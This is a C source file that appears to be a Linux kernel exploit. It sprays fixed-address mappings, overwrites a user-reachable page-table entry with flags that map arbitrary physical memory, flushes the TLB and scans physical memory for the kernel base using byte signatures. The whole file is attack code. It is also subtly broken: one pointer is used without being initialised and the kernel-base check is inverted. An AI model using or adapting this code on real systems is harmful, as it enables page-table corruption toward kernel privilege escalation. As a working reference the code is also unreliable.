#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sys/ioctl.h>

#define SPRAY_MEM (0x800000000 + 0x100000000)
#define PHSY_ALIGN ((unsigned long)0x200000)

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))
static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;


	return 0;
}


static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    
	*status = 0;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = 1;
		puts("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

    if(*status == 0){
        puts("flush berhasil");
    }

	munmap(status, sizeof(short));
}

int main()
{
    // allocate PUD (and a PMD+PTE) for PMD
    void *ret; 
	ret = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if(ret == MAP_FAILED){
        perror("mmap_VIRT_0");
        return EXIT_FAILURE;
    }
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;
    printf("%p = 0x%016lx\n" ,ret,*(unsigned long*)ret);
    printf("address virt: 0x%016lx\n" ,*(unsigned long *)PTI_TO_VIRT(1,0,0,0,0));
    printf("PTI_TO_VIRT: %p\n" ,PTI_TO_VIRT(1,0,0,0,0));
    
    void *retv;
    for(unsigned long i = 0; i < 16000; i++){
       retv = mmap((void*)PTI_TO_VIRT(2,0,i,0,0),0x2000,PROT_READ|PROT_WRITE, MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS,-1,0);
        if(retv == MAP_FAILED){
            perror("map_VIRT_2");
            return EXIT_FAILURE;
        }
    }
    printf("pmd_area before: %p\n" ,retv);

    for(unsigned long i = 0; i < 16000/512; i++){
        *(char *)PTI_TO_VIRT(2,i,0,0,0) = 0x41;
        printf("%p\n" ,(void *)PTI_TO_VIRT(1,1,i,0,0));
    }    

    void *pmd_area = mmap((void*)PTI_TO_VIRT(1,1,0,0,0),0x2000,PROT_READ|PROT_WRITE, MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(pmd_area == MAP_FAILED){
        perror("map_VIRT3");
        return EXIT_FAILURE;
    }

    void *pmd_kernel, *pmd_data;

    pmd_kernel = pmd_area;
    pmd_data = pmd_area + 0x200000;

    printf("pmd_area: %p, pmd_kernel: %p, pmd_data: %p\n" ,pmd_area,pmd_kernel,pmd_data);
    printf("pmd_area: 0x%016lx, pmd_kernel: 0x%016lx, pmd_data: 0x%016lx\n" ,(unsigned long*)pmd_area,
                                (unsigned long*)pmd_kernel,(unsigned long*)pmd_data);
   
    *(unsigned long*)pmd_area = 0xCAFEBABE;

    unsigned long *pte_area;
    void *pmd_kern_area;
    pte_area = NULL;

    for(unsigned long i = 0; i < 16000; i++){
        unsigned long long *test_addr = PTI_TO_VIRT(2,0,i,0,0);
       // printf("test_addr_area: 0x%016llx\n" ,*test_addr);
        if(*test_addr != 0x41){
            //printf("index: %ld\n" ,i);
            //printf("PTE area: 0x%016llx\n" ,*test_addr);
            pte_area = test_addr;
        }
    }

    *pte_area = 0x0 | 0x8000000000000867;
    printf("pte_area: %p = 0x%016llx\n" ,*pte_area,*pte_area);
    flush_tlb(pmd_area,0x400000);

    printf("pmd_area: %p = 0x%016llx\n\n" ,pmd_area, *(unsigned long long*)pmd_area);

    for(int k = 0; k < (SPRAY_MEM / (PHSY_ALIGN * 512)); k++){
        unsigned long long kern_iter;
        kern_iter = k * (PHSY_ALIGN * 512);
        //printf("kernel_iteration: %p 0x%016llx = 0x%016llx\n" ,kern_iter,kern_iter,kern_iter + 0x200000 * 512);

        for(int j = 0; j < 512; j++){
            pte_area[j] = (kern_iter + PHSY_ALIGN  * j) | 0x8000000000000867;
            printf("pte_area: %p = 0x%016llx\n" ,*(pte_area+j), (unsigned long*)(pte_area+j));
        }
        //printf("pte_area: %p = 0x%016llx\n" ,*pte_area, (unsigned long*)pte_area);
        flush_tlb(pmd_area,0x400000);

        for(int i = 0; i < 512; i++){
            unsigned long long phsy_kern_base;

            phsy_kern_base = kern_iter + PHSY_ALIGN * i;
            printf("phsy kernel base: 0x%016llx , val : %p = 0x%016llx\n" ,phsy_kern_base,(pmd_kern_area + i * 0x1000), *(unsigned long long*)(pmd_kern_area + i *0x1000));

            if(is_kernel_base(pmd_kern_area + i * 0x1000) == 0){
                
                printf("found phsy kernel base: -> 0x%016llx\n" ,phsy_kern_base);
                break;
            }         
        }
    }
    printf("pte_area: %p = 0x%016llx\n" ,*pte_area, (unsigned long*)pte_area);

    return EXIT_SUCCESS;
}
